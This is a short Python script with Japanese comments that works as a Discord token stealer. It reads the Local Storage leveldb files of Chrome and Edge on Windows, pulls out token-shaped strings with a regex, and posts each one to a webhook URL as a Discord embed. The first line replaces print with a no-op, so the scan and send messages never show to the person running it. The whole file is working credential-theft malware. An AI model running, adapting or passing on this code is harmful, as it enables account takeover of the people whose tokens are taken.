print = lambda *args, **kwargs: None
import os
import re
import time
import json
from pathlib import Path
import urllib.request
if os.name == 'nt':
    os.system('color')
TOKEN_REGEX = re.compile(r"[\w-]{24,32}\.[\w-]{6}\.[\w-]{27,45}")
WEBHOOK_URL = "WEBHOOK_URL"
PURPLE = '\033[95m'
GREEN = '\033[92m'
CYAN = '\033[96m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'
BOLD = '\033[1m'
def send_webhook(title, description, fields):
    """
    DiscordなどのWebhookに埋め込み（Embed）形式でログを送信します。
    """
    if not WEBHOOK_URL or "YOUR_WEBHOOK_URL_HERE" in WEBHOOK_URL:
        print(f"{RED}[!] Webhook URLが設定されていないため、データは送信されませんでした。{RESET}")
        return
    payload = {
        "embeds": [
            {
                "title": title,
                "description": description,
                "color": 9830655,
                "fields": fields,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
            }
        ]
    }
    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            WEBHOOK_URL, 
            data=data, 
            headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(req) as response:
            if response.status in [200, 204]:
                print(f"{GREEN}[+] スキャンデータがWebhookに正常に記録されました。{RESET}")
            else:
                print(f"{YELLOW}[!] Webhookから応答コード {response.status} が返されました。{RESET}")
    except Exception as e:
        print(f"{RED}[!] Webhookの送信中にエラーが発生しました: {e}{RESET}")
def scan_leveldb_folder(leveldb_path):
    """指定されたleveldbフォルダ内をスキャンしてトークンを返す"""
    tokens = set()
    if not leveldb_path.exists():
        return tokens
    for file_name in os.listdir(leveldb_path):
        if file_name.endswith(".log") or file_name.endswith(".ldb"):
            file_path = leveldb_path / file_name
            try:
                with open(file_path, "rb") as f:
                    content = f.read().decode("utf-8", errors="ignore")
                    matches = TOKEN_REGEX.findall(content)
                    for match in matches:
                        tokens.add(match)
            except Exception:
                continue
    return tokens
def main():
    local_app_data = os.getenv("LOCALAPPDATA")
    if not local_app_data:
        print("[-] AppDataフォルダが見つかりませんでした。Windows環境ですか？")
        return
    target_browsers = {
        "Google Chrome": Path(local_app_data) / "Google" / "Chrome" / "User Data",
        "Microsoft Edge": Path(local_app_data) / "Microsoft" / "Edge" / "User Data"
    }
    found_any = False
    for browser_name, base_path in target_browsers.items():
        if not base_path.exists():
            print(f"[-] {browser_name} のデータフォルダが見つかりません: {base_path}")
            print("-" * 60)
            continue
        print(f"[*] {browser_name} のデータフォルダを確認中... ({base_path})")
        print("-" * 60)
        for folder_name in os.listdir(base_path):
            folder_path = base_path / folder_name
            leveldb_path = folder_path / "Local Storage" / "leveldb"
            if leveldb_path.exists():
                print(f"[+] スキャン中: [{browser_name}] ユーザープロファイル「{folder_name}」")
                tokens = scan_leveldb_folder(leveldb_path)
                if tokens:
                    found_any = True
                    print(f"  🚨 トークンが {len(tokens)} 個見つかりました:")  
                    for token in tokens:
                        print(f"    ▶ [生トークン]: {token}")
                        fields = [
                            {
                                "name": f"{browser_name} ({folder_name})", 
                                "value": f"`{token}`", 
                                "inline": False
                            },
                        ]
                        send_webhook(
                            title="Token Detected",
                            description=f"{browser_name} からトークンがスキャンされました",
                            fields=fields
                        )
                else:
                    print("  ✅ このプロファイルからは見つかりませんでした。")
                print("-" * 40)
    if not found_any:
        print("[*] 対象のブラウザからトークンは検出されませんでした。")
if __name__ == "__main__":
    main()